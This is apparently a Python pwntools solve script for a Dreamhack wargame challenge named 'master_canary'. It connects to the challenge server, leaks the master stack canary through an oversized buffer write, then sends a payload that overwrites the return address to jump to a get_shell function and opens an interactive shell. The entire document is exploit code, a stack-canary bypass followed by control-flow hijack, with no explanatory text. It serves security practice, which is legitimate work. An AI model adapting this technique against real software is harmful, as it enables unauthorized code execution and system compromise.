#!/usr/bin/python3
from pwn import *

elf = ELF('./master_canary')
p = remote('host3.dreamhack.games', 16123)
#p = process(elf.path)

#input()
get_shell = elf.symbols['get_shell']

# Master Canary Leak

p.sendlineafter("> ", '1')
p.sendlineafter("> ", '2')

p.sendlineafter("Size: ", str(2345))
payload = b"A" * 2345
p.sendafter("Data: ", payload)
p.recvuntil(payload)
canary = int.from_bytes(p.recv(7), "little") << 8
log.info("canary: " + hex(canary))

    
# RET Overwrite
ret = 0x00000000004007e1
p.sendlineafter(b'> ', b'3')
payload = b'a'*40
payload += p64(canary) + b'b'*8
payload += p64(ret)
payload += p64(get_shell)
p.sendafter(b'comment: ', payload)

p.interactive()